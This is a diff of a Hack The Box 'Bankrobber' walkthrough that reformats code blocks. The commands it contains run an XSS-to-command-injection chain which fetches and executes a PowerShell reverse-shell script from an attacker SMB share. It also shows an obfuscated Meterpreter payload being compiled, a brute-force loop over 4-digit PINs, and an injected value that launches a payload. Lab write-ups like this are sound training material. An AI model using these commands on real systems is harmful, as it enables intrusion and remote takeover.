@@ -115,7 +115,9 @@ This can be exploited with a modified [nishang Invoke-PowershellTCP.ps1](https:/
 In order to do so I'll use the XSS vulnerability in teh E-coin transfer form to call backdoorchecker.php and use it to load the modified PowerShell script to memory and execute it.
 
 In my working directory I've created another directory to host and smb file share containing the PowerShell script using Impacket's smbserver tool.
-```impacket-smbserver -smb2support test 'pwd'```
+```
+impacket-smbserver -smb2support test 'pwd'
+```
 
 I also start an ncat listener on port 443 that will catch the reverse shell conenction.
 
@@ -127,7 +129,9 @@ I then use Burp to modify an E-coin transfer request and add the following XSS s
 ![burprequest_reverseshell](/assets/images/HTB/Bankrobber/burprequest_reverseshell.jpg)
 
 Which then calls backdoorchecker.php and passes the following command for it to execute:
-```dirfail || powershell -exec bypass -f \\\\10.10.14.51\\test\\shellme.ps1```
+```
+dirfail || powershell -exec bypass -f \\\\10.10.14.51\\test\\shellme.ps1
+```
 
 Since "dirfail" will just fail to do anything, it will then pass to call on PowerShell to execute the shellme.ps1 script while allso temporarily bypassing the PowerShell execution policy (that usually stops scripts from executing).
 
@@ -155,7 +159,10 @@ In order to investigate this process further, I needed to connect to it, but in 
 
 I have created an obfuscated payload using a slightly modified version a Meterpreter loader customizing script found [here](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/). 
 The modifications consist of changing the second to last line to 
-```i686-w64-mingw32-gcc  temp.c -o payload.exe -lws2_32``` so that it works with the newer [mingw-w64](http://mingw-w64.org/doku.php).
+```
+i686-w64-mingw32-gcc  temp.c -o payload.exe -lws2_32
+``` 
+so that it works with the newer [mingw-w64](http://mingw-w64.org/doku.php).
 I then copied the resulting payload.exe file to my previously created smb share directory. 
 ![payloadexe](/assets/images/HTB/Bankrobber/payloadexe.jpg)
 
@@ -174,7 +181,9 @@ And then used ncat to connect to the port that bankv2.exe was listening on.
 
 The connection to bankv2 is closed pretty fast if there is no interaction and it seems that bankv2 is requesting a 4 digit PIN and, after trying a couple few times with random PINs, I resorted to using a loop to go through all the possible combinations of 0000-9999.
 I used the following loop to generate combinations between 0000 and 9999, print the current PIN and then pipe it to the ncat connection to port 910 (bankv2).
-```for i in {0..9}{0..9}{0..9}{0..9}; do echo $i | nc -vn 127.0.0.1 910; done```
+```
+for i in {0..9}{0..9}{0..9}{0..9}; do echo $i | nc -vn 127.0.0.1 910; done
+```
 ![pinloop](/assets/images/HTB/Bankrobber/pinloop.jpg)
 
 After a few iterations, it finds the correct PIN: 0021
@@ -186,7 +195,9 @@ To exploit bankv2 in order to get a Meterpreter shell as admin, I created anothe
 ![meterpreter2](/assets/images/HTB/Bankrobber/meterpreter2.jpg)
 
 And then executed the payload2.exe file by passing the following input to bankv2's E-coin transfer:
-```& ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\Desktop\test\payload2.exe```
+```
+& ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\Desktop\test\payload2.exe
+```
 
 ![bankv2exploitcall](/assets/images/HTB/Bankrobber/bankv2exploitcall.jpg)
 
